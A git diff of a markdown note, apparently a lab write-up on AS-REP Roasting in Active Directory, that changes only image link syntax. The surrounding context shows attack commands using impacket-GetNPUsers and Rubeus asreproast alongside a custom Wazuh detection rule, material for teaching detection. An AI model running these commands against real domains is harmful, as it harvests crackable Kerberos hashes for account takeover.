@@ -20,10 +20,10 @@ Verify: `Get-ADUser -Identity "asreppeduser" -Properties DoesNotRequirePreAuth |
 ***Attack***
 
 From Linux: `impacket-GetNPUsers -dc-ip $IP $FQDN/asreppeduser -no-pass -request`
-![[Active Directory/AS-REP Roasting/kali linux impacket.png]]
+![Description](Screenshots/kali%20linux%20impacket.png)
 
 From Windows: `.\Rubeus.exe asreproast` 
-![[Powershell Rubeus asreproast.png]]
+![Description](Powershell%20Rubeus%20asreproast.png)
 
 
 ***Detection***
@@ -41,7 +41,7 @@ Custom Wazuh Rule:
    </mitre>
    </rule>
 ```
-![[Active Directory/AS-REP Roasting/Wazuh.png]]
+![Description](Screenshots/Wazuh.png)
 
 | Field                                | Value                   | Meaning               |
 | ------------------------------------ | ----------------------- | --------------------- |
